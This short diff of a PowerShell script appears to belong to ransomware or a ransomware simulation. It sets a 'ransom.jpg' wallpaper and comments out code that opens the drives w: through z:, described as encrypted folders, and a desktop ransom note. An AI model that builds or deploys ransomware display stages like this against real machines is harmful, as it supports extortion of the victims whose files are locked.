@@ -76,15 +76,15 @@ public class Params
  
 Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Fit
 
-Start-Sleep 3
-function EncryptedFiles 
-{ 
-    # $Source = "w:\" # replace the path with the folders you encrypted
-    explorer w:
-    explorer x:
-    explorer y:
-    explorer z:
-} 
+# Start-Sleep 3
+# function EncryptedFiles 
+# { 
+#     # $Source = "w:\" # replace the path with the folders you encrypted
+#     explorer w:
+#     explorer x:
+#     explorer y:
+#     explorer z:
+# } 
 
-EncryptedFiles
-notepad c:/users/$env:USERNAME/desktop/ransom.txt
+# EncryptedFiles
+# notepad c:/users/$env:USERNAME/desktop/ransom.txt
